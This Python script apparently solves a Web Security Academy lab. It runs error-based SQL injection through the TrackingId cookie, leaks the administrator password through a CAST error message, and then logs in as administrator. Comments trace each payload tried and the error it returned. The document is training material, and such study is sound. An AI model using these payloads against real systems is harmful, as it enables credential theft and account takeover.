import requests
from typing import Optional, Any

BASE_URL = "https://0ae3000e032fcf17800c852100dd0086.web-security-academy.net"
FILTER_URL = BASE_URL+"/filter"
TRACKING_ID = "3Zj4aNJsJw9ZO83a"

session = requests.Session()

def get_request(url:str, cookies:dict[str,str]=None, params:dict[str, Any]=None, timeout:int=10)->Optional[requests.Response]:
    try:
        return session.get(url, params=params, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def payload_request(payload:str)->Optional[requests.Response]:
    try:
        cookies={
            "TrackingId":payload,
            "session":"bIfFiCJMIPn16WxefBwLeG85NvVg5M99"
        }
        params={
            "category":"Gifts"
        }
        return get_request(FILTER_URL,cookies=cookies,params=params)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def payload_test(payload:str)->requests.Response:
    response = payload_request(payload)
    print(response.text)
    return response

def post_request(url:str, data:dict[str, Any], timeout:int = 10)->Optional[requests.Response]:
    try:
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def get_csrf(url:str)->Optional[str]:
    response = get_request(url)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    if csrf_input:
        return csrf_input.get("value")
    else:
        return None

def login(pw:str):
    url = BASE_URL+"/login"
    data={
        "csrf":get_csrf(url),
        "username":"administrator",
        "password":pw
    }
    response = post_request(url,data)
    if "Your username is: administrator" in response.text:
        print("login success")

def get_pw(html:str)-> Optional[str]:
    
    import re
    pattern = r'ERROR: invalid input syntax for type integer:\s*"([^"]+)"'
    match = re.search(pattern, html)

    if match:
        value = match.group(1)
        print("Captured:", value)  # 輸出: meygkq9f3q5yxt1oq415
        return value
    else:
        print("No match")
        return None


def main():
    # """
    # Unterminated string literal started at position 52 in SQL 
    # SELECT * FROM tracking WHERE id = '3Zj4aNJsJw9ZO83a''. Expected  char
    # """
    # payload_test(TRACKING_ID+"'")

    # # no error
    # payload_test(TRACKING_ID+"''")

    # # no error
    # payload_test(TRACKING_ID+"' -- ")

    # """
    # ERROR: argument of AND must be type boolean, not type integer
    # Position: 63
    # """
    # payload_test(TRACKING_ID+"' AND CAST((select 1) as int ) -- ")

    # # no error
    # payload_test(TRACKING_ID+"' AND 1=CAST((select 1) as int ) -- ")

    # """
    # Unterminated string literal started at position 95 in SQL 
    # SELECT * FROM tracking WHERE id = '3Zj4aNJsJw9ZO83a' AND 1=CAST((select username from users ) a'
    # . Expected  char
    # """
    # payload_test(TRACKING_ID+"' AND 1=CAST((select username from users ) as int )-- ")

    # """
    # ERROR: more than one row returned by a subquery used as an expression
    # """
    # payload_test("' AND 1=CAST((select username from users ) as int ) -- ")

    # """
    # Unterminated string literal started at position 95 in SQL 
    # SELECT * FROM tracking WHERE id = '' AND 1=CAST((select username from users LIMIT 1 ) as int) -'
    # . Expected  char

    # 這邊注意這段payload跟官方的"as int) --"這個部分不一樣
    # 我在--前面多一個空格才導致此錯誤
    # """
    # payload_test("' AND 1=CAST((select username from users LIMIT 1 ) as int) -- ")

    # # ERROR: invalid input syntax for type integer: "administrator"
    # payload_test("' AND 1=CAST((select username from users LIMIT 1 ) as int)-- ")

    # ERROR: invalid input syntax for type integer: "meygkq9f3q5yxt1oq415"
    response = payload_test("' AND 1=CAST((select password from users LIMIT 1 ) as int)-- ")
    pw = get_pw(response.text)
    login(pw)

if __name__ == "__main__":
    main()